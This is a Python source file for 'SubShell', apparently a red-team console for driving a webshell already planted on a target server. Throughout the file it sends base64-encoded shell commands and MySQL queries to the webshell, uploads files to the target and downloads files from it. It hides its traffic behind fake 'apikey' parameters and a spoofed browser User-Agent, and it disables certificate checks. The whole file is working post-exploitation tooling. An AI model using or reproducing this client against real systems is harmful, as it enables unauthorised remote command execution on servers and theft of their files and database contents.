## Title:       subshell.py
## Author:      Joe Vest
## Description: Command console framework that control webshells

"""
  _________    ___      _________ __            __   __   
 /   _____/__ _\  |__  /   _____/|  |__   ____ |  | |  |  
 \_____  \|  |  \ __ \ \_____  \ |  |  \_/ __ \|  | |  |  
 /        \  |  / \_\ \/        \|   |  \  ___/|  |_|  |__
/_________/____/|_____/_________/|___|__/\_____>____/____/

SubShell - Webshell Console - Joe Vest - 2015

Usage: 
    subshell.py  --url=<url>
    subshell.py  --url=<url> [--useragent=<useragent] [--logdir=<logdir>] [--debug] [--mysqlu=<MySQL Username] [--mysqlp=<MySQL Password> [--mysqls=<MySQL Server>]]
    subshell.py (-h | --help) More Help and Default Settings

Options:
    -h --help                This Screen
    --url=<url>              URL source of webshell (http://localhost:80)
    --useragent=<useragent>  User-Agent String to use [default: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)]
    --mysqlu=<username>      Set MYSQL Username [default: root]
    --mysqlp=<password>      Set MySQL Password [defaul: "" ]
    --mysqls=<server>        Set MySQL Server IP or Hostname [default: 127.0.0.1]
    --logdir=<logdir>        Directory path to logs [default: ./logs]
    --debug                  Enable Debugging

"""

import os
import base64
import cmd
import json
from tabulate import tabulate
import readline
import requests
import sys
import docopt
import datetime
import calendar
import re
import shlex
import signal
import threading
import time
from socket import timeout as TimeoutException
from UserString import MutableString

READLINE = True

debug = False # Debug mode

def sig_break_handler(signum, frame):
    """signal handler: Ctrl-Z, Ctrl-C, Ctrl-D"""
    console.postloop() 


def buildSessionID(delta=0):
    """
    Build a base64 encoded epoch time.
    This will be authentication to the webshell.
    Host machine must be within 12 hrs +/- of targets time.
    Otherwise supply a delta to overcome this time difference.
    """
    now = datetime.datetime.utcnow()
    now = str(calendar.timegm(now.utctimetuple()) + delta)
    encoded = now
    encoded = base64.b64encode(encoded).strip()
    return encoded

def color(text="", clr=None, background=None, style=None,reset=True):
    """colored text..."""
    colors = {
        'OKBLUE'  : '\033[94m',
        'OKGREEN' : '\033[92m',
        'WARNING' : '\033[93m',
        'FAIL'    : '\033[91m',
        'BLACK'   : '\033[30m',
        'RED'     : '\033[31m',
        'GREEN'   : '\033[32m', 
        'YELLOW'  : '\033[33m',
        'BLUE'    : '\033[34m', 
        'PURPLE'  : '\033[35m',
        'CYAN'    : '\033[36m', 
        'WHITE'   : '\033[37m' }

    styles = {
        'BOLD'    : '\033[1m',
        'HEADER'  : '\033[95m'}

    backgrounds = {
        'BLACK'   : '\033[40m',
        'RED'     : '\033[41m',
        'GREEN'   : '\033[42m',
        'YELLOW'  : '\033[43m',
        'BLUE'    : '\033[44m',
        'PURPLE'  : '\033[45m',
        'CYAN'    : '\033[46m',
        'WHITE'   : '\033[47m'}

    if reset:
        ENDC = '\033[0m'
    else:
        ENDC = ''

    sys.setrecursionlimit(999999999)
    text = MutableString(text) 

    #COLORS
    if clr:
        clr = clr.split()
        clrs = []
        for each in clr:
            clrs.append(colors[each.upper()])
        if len(clrs) > 1:        
            for i in xrange(len(text)).__reversed__():
                text[i] = random.sample(clrs,1)[0] + text[i]
        else:
            text = clrs[0] + str(text)

    #BACKGROUND
    if background:
        BACKGROUND = backgrounds[background.split()[0].upper()]
        text = BACKGROUND + text
 
    #STYLES
    if style:
        style = style.split()
        STYLE = ""
        for each in style:
            STYLE += styles[each.upper()]
        text = STYLE + text
 
    return text+ENDC

########################################
# Console Class
########################################
class Console(cmd.Cmd):
    """ Main Console """

    def __init__(self,url,uas,logdir,delta=0):
        cmd.Cmd.__init__(self)
        self.url = url
        self.useragentstring = uas
        targetRE = re.compile("^.+://(.+?)/.+$")
        self.target = targetRE.match(url).groups()[0]
        self.delta = delta
        self.logfile = os.path.join(logdir,datetime.datetime.now().strftime("%Y%m%d-%H%M%S") + ".log")
        self.download_threads = []
        self.upload_threads = []

        if not os.path.exists(logdir):
            os.makedirs(logdir)

        ########################################
        # HTTP Headers
        ########################################
        self.headers = {}
        self.headers["User-Agent"] = self.useragentstring
        self.timeout = 10 # Default timeout in seconds

        ########################################
        # MYSQL Varibles
        ########################################
        self.mysqlServer = mysqlS
        self.mysqlDB     = ""
        self.mysqlUser   = mysqlU
        self.mysqlPass   = mysqlP

        ########################################       
        # Setup Reuseable HTTP session
        ########################################
        self.s = requests.Session()
        self.s.headers.update(self.headers)
        self.currentdir = None

        ########################################
        # Initial Commands
        ########################################
        self.do_pwd()
        self.do_config()
        self.prompt = "["+self.currentdir + "]# "

  
    # Log data to file
    def log(self,value):
        """ Log value to text file """
        f = open(self.logfile,"a")
        f.write(str(value)+"\n")
        f.close()

    # HTTP Request Function
    def sendCommand(self, url, commandType, command, **kwargs):
        """
        url         target url
        type        type of command
        command     command to send
        **kwargs    used to upload file
        """
        self.log("-" * 60)
        self.log("TIMESTAMP  : " + datetime.datetime.now().strftime("%Y%m%d-%H%M%S"))
        self.log("COMMANDTYPE: " + commandType + "\n")
        self.log(command)
        result = ""

        c = base64.b64encode(command).rstrip()
        
        if commandType == 'command': # HTTP Parameter = apikey
            data = {'sessionid' : buildSessionID(self.delta), 'apikey':c}

        elif commandType == 'download': # HTTP Parameter = apikeyd
            data = {'sessionid' : buildSessionID(self.delta), 'apikeyd':c}

        elif commandType == 'upload': # HTTP Parameter = apikeyu, feed
            data = {'sessionid' : buildSessionID(self.delta), 'apikeyu':c, 'feed':kwargs['toUpload']}

        elif commandType == 'mysql': # HTTP Parameter = apikeym, s1, s2 ,s3, s4
            data = {'sessionid' : buildSessionID(self.delta), 
                    'apikeym':c, 
                    's1':base64.b64encode(self.mysqlServer), 
                    's2':base64.b64encode(self.mysqlDB), 
                    's3':base64.b64encode(self.mysqlUser),
                    's4':base64.b64encode(self.mysqlPass)
                    }

        else:
            data = {}
            msg = "Unknown commandType"
    
        try:
            r = self.s.post(url, data=data,verify=False, timeout=self.timeout)

            if r.status_code == 408:
                self.delta = int(r.headers['Warning'])
                data['sessionid'] = buildSessionID(self.delta)
                r = self.s.post(url, data=data,verify=False, timeout=self.timeout)
                msg = " ** Time delta modified by", self.delta,"seconds."
                print color(msg,clr="WARNING",style="bold")
                self.log(msg)

            if r.status_code == 200:
                # Remove Beginning and trailing newlines
                result = r.text.strip()                 
                
                ####### DEBUGGING REMOTE ERRORS
                if debug: print color("\t----- DEBUGGING ----- \n" + result + "\n\t----- DEBUGGING -----",clr="yellow",style="bold")
                ####### DEBUGGING REMOTE ERRORS

                resultDecoded = base64.b64decode(result) # B64 Decoded value

                # Remove Initial 'null ' string value
                resultClean = resultDecoded.lstrip('null ')
                # B64 Encode clean result
                resultCleanEncoded = base64.b64encode(resultClean)
                result = resultCleanEncoded

            elif r.status_code == 408:
                banner = "\nTime delta failed to self correct.\nEntering debug mode\n"
                import code;code.interact(banner=banner,local=locals())
                    
            else:
                result = ""
                msg = "HTTP status code", r.status_code
                print color(msg,clr="WARNING",style="bold")
                self.log(msg)
                
                msg = r.text
                print color(msg,clr="WARNING",style="bold")
                self.log(msg)
        
        except requests.ConnectionError as e:
            msg = "[!] (" + commandType + ") ERROR (CONNECTION): \n" + str(e.message)
            print color(msg,"red", style="bold")
            self.log("[!] ERROR (CONNECTION)")
            self.log(e.message)
            return ''

        except requests.Timeout as e:
            msg = "[!] (" + commandType + ") ERROR (TIMEOUT): \n" + str(e.message[-1])
            print color(msg,"red", style="bold")
            self.log("[!] ERROR (TIMEOUT)")
            self.log(e.message)
        
        return base64.b64decode(result)

    def thread_cleanup(self):
        """ clean up thread queue """
        for t in self.upload_threads:
            if not t.isAlive():
                self.upload_threads.remove(t)
        for t in self.download_threads:
            if not t.isAlive():
                self.download_threads.remove(t)

    ## Command definitions ##

 




    def do_history(self, args):
        """Print a list of last 20 commands that have been entered"""
        for item in self._history[-21:-1]:
            print color(item,"blue",style="bold")

    def do_exit(self, args=None):
        """Exits from the console"""
        return -1
        self.postloop()

    def do_status(self, args=None):
        """Query Download / Upload status"""
        self.thread_cleanup()
        print color("\t\tDOWNLOAD/UPLOAD QUEUE" + " " * 20,clr="yellow",background="blue",style="bold")

        print color("[Downloads]","blue",style="bold")
        for t in self.download_threads:
            print "\t",t.name
        print color("[Uploads]","blue",style="bold")
        print ""
        for t in self.upload_threads:
            print "\t",t.name

    def do_config(self, args=None):
        """Show current settings"""

        banner = "\t\tCURRENT CONFIGURATION" + " " * 20
        output = ""
        output += "Debug:             {0}\n".format(debug)
        output += "Target URL:        {0}\n".format(self.url)
        output += "Log File:          {0}\n".format(self.logfile)
        output += "User-Agent:        {0}\n".format(self.useragentstring)
        output += "HTTP Timeout:      {0}\n".format(self.timeout)
        output += "Current Directory: {0}\n".format(self.currentdir)
        output += "MYSQL Server:      {0}\n".format(self.mysqlServer)
        output += "MYSQL DB:          {0}\n".format(self.mysqlDB)
        output += "MYSQL Username:    {0}\n".format(self.mysqlUser)
        output += "MYSQL Password:    {0}\n".format(self.mysqlPass)

        print color(banner,clr="yellow",background="blue",style="bold")
        print color(output,"blue",style="bold")
        print ""

        self.log("TIMESTAMP  : " + datetime.datetime.now().strftime("%Y%m%d-%H%M%S"))
        self.log("config")
        self.log(output)


    def do_timeout(self, args):
        """Sets timeout (seconds) used for HTTP requests"""
        
        try:
            self.timeout = int("".join(args))
            result = color("Timeout set to " + str(int(args)),clr="blue",style="bold")
        except:
            result =  color("Timeout must be integer\nCurrent Timeout: %s" % self.timeout,clr="WARNING",style="bold")

        print result

        self.log("-" * 60)
        self.log("TIMESTAMP  : " + datetime.datetime.now().strftime("%Y%m%d-%H%M%S"))
        self.log(result)


    def do_command(self, args):
        """Issues remote command through webshell to remote system. """
        commandType = 'command'
        result = self.sendCommand(self.url, commandType, args)
        print color(result,clr="green",style="bold")
        self.log(result)
    
    def do_mysql(self, args):
        """Issues SQL command to MYSQL database. """
        commandType = 'mysql'
        result = self.sendCommand(self.url, commandType, args)
        
        try:
            isJson = True
            json.loads(result)


        except ValueError:
            isJson = False
        
        if isJson:
            j = json.loads(result)

            if j == 0:
                msg = "[!] Bad Query or No Results"
                print color(msg,clr="WARNING", style="bold")
                self.log(msg)

            else:
                output = tabulate(j,headers='keys')
                row, columns = os.popen("stty size","r").read().split()
                for line in output.split("\n"):
                    print color(line[:int(columns)], clr="blue", style="bold")

                print color("[!] Result is truncated based on screen width",clr="WARNING", style="bold")
                print color("[!] Review Log for Full Detail",clr="WARNING", style="bold")
              
                self.log("JSON OUTPUT\n")
                self.log(result)
                self.log("TABLE OUTPUT\n")
                self.log(output)

        else:
            print color(result,clr="WARNING",style="bold")

    def do_mysql_db(self, args):
        """Set MYSQL Database"""
        if args == "":
            result = "Must provide a database"
            print color(result,clr="WARNING",style="bold")
            result = "Current MYSQL DB is {0}".format(self.mysqlDB)
            print color(result,clr="blue",style="bold")
            return
        self.mysqlDB = args
        result = "MYSQL DB changed to {0}".format(self.mysqlDB)
        print color(result,clr="blue",style="bold")
        
    def do_mysql_server(self, args):
        """Set MYSQL Server"""
        if args == "":
            result = "Must provide a server or IP address"
            print color(result,clr="WARNING",style="bold")
            result = "Current Server is {0}".format(self.mysqlServer)
            print color(result,clr="blue",style="bold")
            return
        self.mysqlServer = args
        result = "MYSQL Server changed to {0}".format(self.mysqlServer)
        print color(result,clr="blue",style="bold")

    def do_mysql_username(self, args):
        """Set MYSQL Username"""
        if args == "":
            result = "Must provide a username"
            print color(result,clr="WARNING",style="bold")
            result = "Current Username is {0}".format(self.mysqlUser)
            print color(result,clr="blue",style="bold")
            return
        self.mysqlUser = args
        result = "MYSQL Username changed to {0}".format(self.mysqlUser)
        print color(result,clr="blue",style="bold")

    def do_mysql_password(self, args):
        """Set MYSQL Password"""
        if args == "":
            result = "Must provide a password"
            print color(result,clr="WARNING",style="bold")
            result = "Current Password is {0}".format(self.mysqlPass)
            print color(result,clr="blue",style="bold")
            return
        self.mysqlPass = args
        result = "MYSQL Password changed to {0}".format(self.mysqlPass)
        print color(result,clr="blue",style="bold")       

    def do_python(self, args=None):
        """Drops to an interactive python shell"""
        print color("\n\tDropping to an interactive Python shell.\n\t\tCtrl-D to return to prompt.\n","yellow")
        import code;code.interact(local=locals())
     
    def do_ps(self, args=None):
        """Calls tasklist on target"""
        commandType = 'command'
        result = self.sendCommand(self.url, commandType,'tasklist')
        print color(result,clr="green",style="bold")

    def do_cd(self, args):
        """Change directory"""
        self.currentdir = self.build_dir(args)
        self.prompt = color()+"["+color(self.currentdir,"green") + "]# "         
        self.log("Directory changed to " + self.currentdir)

    def do_ls(self, args):
        """List contents of current directory."""
        commandType = 'command'
        if args is not None:
            args = self.build_dir(args)
        result = self.sendCommand(self.url, commandType,'dir ' + args)
        print color(result,clr="green",style="bold")
        self.log(result)

    def do_dir(self,args):
        """Calls ls, to prevent dir'ing your actual cwd instead of the virtual set by cd"""
        self.do_ls(args)
    
    def do_shell(self, args):
        """Pass command to local system shell for execution."""
        os.system(args)

    def do_pwd(self, args=None):
        """Execute sendCommand 'echo %cd%' to obtain current working directory"""
        if self.currentdir is None:
            self.currentdir = self.sendCommand(self.url, 'command', 'echo %cd%').strip().lower()
        else:
            print self.currentdir
            self.log("PWD: " + self.currentdir)

    def do_download(self, args):
        """
        Download file from target
        \tdownload <remote-source>
        \tdownload targetile.txt
        \tdownload c:\\widnows\\temp\\targetfile.txt
        """
        filepath = args
        defaultpath = os.path.join("downloads",self.target)

        if (not args):
            print color("Missing arguments",clr="FAIL",style="bold")
            self.do_help("download")
            return ""

        #Determine Relative or Absolute path
        if (":\\" in filepath[0:3]):
            #Absolute path, do nothing
            pass
        elif (filepath.startswith("\\\\")):
            #UNC Path
            pass
        else:
            #Relative path
            filepath = self.currentdir + "\\" + filepath

        print color("Downloading " + filepath + " ...",clr="blue",style="bold")
        t = threading.Thread(target=self.new_download, args=(filepath,defaultpath),name=filepath)
        self.download_threads.append(t)
        s = self.timeout
        self.timeout = 180
        t.start()
        time.sleep(.25)
        self.timeout = s

    def new_download(self, args=None, defaultpath=None):
        """New thread for downloads"""

        filepath = args
        commandType = 'download'
        try:
            result = self.sendCommand(self.url, commandType, filepath)
        except TimeoutException:
            print color("\n\tDownload for " + filepath + " has timed out. =(", "red", style="bold")
            return
                
        defaultpath = defaultpath.replace(":","_")
        if not os.path.exists(defaultpath):
            os.makedirs(defaultpath)
        localpath = os.path.join(defaultpath,os.path.split(filepath.replace("\\","/").lstrip("//"))[0])
        localfile = os.path.split(filepath.replace("\\","/"))[1]
        fixedpath = []
        while True:
            if localpath == '' or localpath == '//':
                break
            p = os.path.split(localpath)[1]
            localpath = os.path.split(localpath)[0]
            fixedpath.insert(0,p.replace(":","").lower())
        localpath = os.path.join(*fixedpath)
        try:
            os.makedirs(localpath)
        except OSError:
            pass
        f = None
    
        # Is file blank?
        if result == "":
            msg = "File has no data or does not exist.  Save cancled: {0}".format(filepath)
            print color(msg,clr="WARNING",style="bold")
            self.log(msg)
            return

        # Save downloaded file
        if not os.path.exists(os.path.join(localpath, localfile)):
            f = open(os.path.join(localpath, localfile),'wb')
            f.write(result)
            f.close()
            print color("Download complete:" + localfile,clr="blue",style="bold")
        else:
            msg = "Already downloaded? File '{0}' already exists".format(os.path.join(localpath, localfile))
            print color(msg,clr="WARNING",style="bold")
            self.log(msg)

    def do_upload(self, args):
        """
        Upload file to target
        \tupload <local-source> <remote-destination-full-path>
        \tupload myfile.txt c:\\windows\\temp\\myfile.txt
        """ 
        if (not args):
            print color("Missing arguments",clr="FAIL",style="bold")
            self.do_help("upload")
        else:
            self.thread_cleanup()
            if os.path.getsize(args.split()[0]) > 2000000:
                print color("\n\tWARNING File exceeds 2mb limit. This may fail depending on server config.","red",style="bold")
                time.sleep(5)    
            s = self.timeout
            self.timeout = 180
            t = threading.Thread(target=self.new_upload, args=(args,),name=args.split()[0])
            self.upload_threads.append(t)
            
            t.start()
            time.sleep(.25)
            self.timeout = s

    def new_upload(self, args):
        """New thread for uploads""" 

        # parse src / dst files
        args = args.replace('\\','\\\\')
        args = shlex.split(args)
        src = args[0]
        if len(args) > 1:
            dst = args[1]
        else:
            dst = ".\\"+os.path.split(src)[1]

        if os.path.isdir(src):
            print color("\n\tSorry, I cannot upload a directory..","red")
        
        elif os.path.isfile(src):            
            
            f = base64.b64encode(open(src, "rb").read())
            commandType = 'upload'
            try:
                print color("\n\tUploading " + src + " to " + dst + " ...\n","blue",style="bold")
                result = self.sendCommand(self.url, commandType, dst, toUpload = f)

            except requests.Timeout:
                print color("Upload thread for " + src + " has timed out. =(", "red", style="bold")

            print color(result,"blue",style="bold")

        else:
            print color("\n\tLocal file: "+src+" does not exist..","red")


    def do_help(self, args):
        """Get help on commands
           'help' or '?' with no arguments prints a list of commands for which help is available
           'help <command>' or '? <command>' gives help on <command>
        """
        ## The only reason to define this method is for the help text in the doc string
        cmd.Cmd.do_help(self, args)

    def build_dir(self,change):
        if ":\\" in change[0:3] or change.startswith("\\\\"):
            return change.lower()
        else:
            newdir = self.currentdir
            change = change.split("\\")
            for each in change:
                if each == "..":
                    newdir = newdir.rsplit("\\",1)[0]
                elif each == "":
                    continue
                else:
                    newdir = newdir + "\\" + each
            return newdir.lower()

    ## Override methods in Cmd object ##
    def preloop(self):
        """Initialization before prompting user for commands.
           Despite the claims in the Cmd documentaion, Cmd.preloop() is not a stub.
        """
        cmd.Cmd.preloop(self)   ## sets up command completion
        self._history    = []      ## No history yet
        self._locals  = {}      ## Initialize execution namespace for user
        self._globals = {}

    def postloop(self):
        """Take care of any unfinished business.
           Despite the claims in the Cmd documentaion, Cmd.postloop() is not a stub.
        """
        cmd.Cmd.postloop(self)   ## Clean up command completion

        print color(reset=True)
        print "Exiting..."
        return os.kill(os.getpid(),signal.SIGKILL) #forceful exit
        self.log("Exiting...")
        sys.exit()


    def precmd(self, line):
        """ This method is called after the line has been input but before
            it has been interpreted. If you want to modifdy the input line
            before execution (for example, variable substitution) do it here.
        """
        self._history += [ line.strip() ]
        return line

    def postcmd(self, stop, line):
        """If you want to stop the console, return something that evaluates to true.
           If you want to do some post command processing, do it here.
        """
        return stop

    def emptyline(self):    
        """Do nothing on empty input line"""
        pass

    def default(self, line):       
        """Called on an input line when the command prefix is not recognized.
           In that case we execute the line as Python code.
        """
        
        """Issues command to send HTTP Request"""
        commandType = 'command'
        result = self.sendCommand(self.url, commandType, line)
        print result
        self.log(result)


if __name__ == '__main__':

    
    intro = """
  _________    ___      _________ __            __   __   
 /   _____/__ _\  |__  /   _____/|  |__   ____ |  | |  |  
 \_____  \|  |  \ __ \ \_____  \ |  |  \_/ __ \|  | |  |  
 /        \  |  / \_\ \/        \|   |  \  ___/|  |_|  |__
/_________/____/|_____/_________/|___|__/\_____>____/____/

SubShell - Webshell Console - Joe Vest - 2015
"""
    
    try:
        # Parse arguments, use file docstring as a parameter definition
        arguments = docopt.docopt(__doc__,help=True)        
        
        url     = arguments['--url']
        uas     = arguments['--useragent']
        logdir  = arguments['--logdir']
        debug   = arguments['--debug']
        mysqlU  = arguments['--mysqlu'] 
        mysqlP  = arguments['--mysqlp']
        mysqlS  = arguments['--mysqls'] 

        os.system("clear")
        target = color(url,clr="black",background="yellow",style="bold")
        print intro
        print color("Connecting to " + url,"yellow",style="bold")

        console = Console(url,uas,logdir)
        signal.signal(signal.SIGTSTP,sig_break_handler)
        signal.signal(signal.SIGINT,sig_break_handler)
        console . cmdloop() 
        
    # Handle invalid options
    except docopt.DocoptExit as e:
        print e.message


    

    